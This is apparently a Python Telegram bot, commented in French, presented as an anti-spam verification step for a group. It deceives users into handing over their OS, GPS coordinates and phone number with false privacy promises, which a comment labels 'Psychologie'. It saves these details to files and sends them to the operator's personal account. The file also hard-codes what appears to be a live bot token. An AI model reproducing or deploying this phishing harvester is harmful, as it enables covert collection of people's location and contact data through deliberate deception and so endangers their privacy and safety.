import json
import logging
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, WebAppInfo, ChatPermissions
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ChatMemberHandler

# --- CONFIGURATION ---
TOKEN = "8513965542:AAF0_QXO9PT9UOEPlbnVXaHs4o57elytH1s"
WEBAPP_URL = "https://github.com/xyko1041/mon-bot-verif.git" # Ton lien GitHub Pages
MON_ID_TELEGRAM = 5131307841  # Ton ID perso pour recevoir les rapports

# Activation des logs pour voir les erreurs dans le terminal
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    
    # Message d'accueil avec valorisation
    text = (
        f"👋 **Bienvenue {user.first_name} !**\n\n"
        "🛡️ **SÉCURITÉ LEAKS-FREE**\n"
        "Pour protéger nos membres des bots et du spam, l'écriture sur le groupe est "
        "actuellement **bloquée** pour ton compte.\n\n"
        "Approuve le règlement ci-dessous pour lancer la procédure de déblocage."
    )
    
    kb = [[KeyboardButton("📖 Lire le Règlement & Valider", web_app=WebAppInfo(url=WEBAPP_URL))]]
    await update.message.reply_text(text, reply_markup=ReplyKeyboardMarkup(kb, resize_keyboard=True), parse_mode="Markdown")

async def handle_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Récupération de l'OS via la Mini App
    data = json.loads(update.effective_message.web_app_data.data)
    context.user_data['os'] = data.get("os")
    
    text = (
        f"✅ **Système {context.user_data['os']} identifié.**\n\n"
        "📍 **SECTEUR GÉOGRAPHIQUE**\n"
        "Partage ta position pour nous aider à filtrer les accès par région et éviter les raids de bots étrangers."
    )
    
    btn_geo = KeyboardButton("📍 Partager ma position GPS", request_location=True)
    await update.message.reply_text(text, reply_markup=ReplyKeyboardMarkup([[btn_geo]], resize_keyboard=True), parse_mode="Markdown")

async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    loc = update.message.location
    context.user_data['geo'] = f"{loc.latitude}, {loc.longitude}"
    
    # Psychologie : Rassurance sur la confidentialité
    text = (
        "🔐 **DERNIÈRE ÉTAPE : VÉRIFICATION CERTIFIÉE**\n\n"
        "Clique sur le bouton ci-dessous pour confirmer ton identité via ton numéro Telegram.\n\n"
        "⚠️ **CONFIDENTIALITÉ :**\n"
        "• Aucune sauvegarde de ton numéro n'est faite sur nos serveurs.\n"
        "• Ton numéro reste strictement invisible pour les autres membres.\n"
        "• Cette étape sert uniquement à prouver que tu n'es pas un robot."
    )
    
    btn_contact = KeyboardButton("🛡️ Certifier mon compte (Anonyme)", request_contact=True)
    await update.message.reply_text(text, reply_markup=ReplyKeyboardMarkup([[btn_contact]], resize_keyboard=True), parse_mode="Markdown")

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    user = update.message.from_user
    chat_id = update.effective_chat.id # ID du groupe ou DM
    
    # 1. Préparation des infos pour ton fichier local
    user_info = {
        "id": user.id,
        "username": user.username,
        "phone": contact.phone_number,
        "os": context.user_data.get('os'),
        "geo": context.user_data.get('geo'),
        "reason": "Vérification réussie"
    }

    # 2. Création du fichier local (sur ton PC ou serveur)
    filename = f"user_{user.id}.info"
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(user_info, f, indent=4, ensure_ascii=False)

    # 3. Envoi du rapport à l'Admin (Toi)
    rapport = (
        "🚨 **NOUVEAU MEMBRE VÉRIFIÉ** 🚨\n\n"
        f"👤 Nom : {user.first_name}\n"
        f"🆔 ID : `{user.id}`\n"
        f"📞 Tel : `{contact.phone_number}`\n"
        f"📱 OS : {context.user_data.get('os')}\n"
        f"📍 GPS : `{context.user_data.get('geo')}`"
    )
    await context.bot.send_message(chat_id=MON_ID_TELEGRAM, text=rapport, parse_mode="Markdown")

    # 4. Message final et déblocage
    await update.message.reply_text("✅ **Vérification terminée !**\n\nTu as maintenant accès à l'écriture sur le groupe. Bienvenue !")

    # Ici, on redonne les permissions (si c'est un groupe)
    # Note : Le bot doit être admin du groupe pour que ça marche
    try:
        await context.bot.restrict_chat_member(
            chat_id="3716530317", # Remplace par l'ID de ton groupe (commence par -100)
            user_id=user.id,
            permissions=ChatPermissions(can_send_messages=True, can_send_photos=True, can_send_videos=True)
        )
    except Exception as e:
        print(f"Erreur de permissions : {e}")

if __name__ == '__main__':
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp_data))
    app.add_handler(MessageHandler(filters.LOCATION, handle_location))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    
    print("Bot en ligne... En attente de vérifications.")
    app.run_polling()
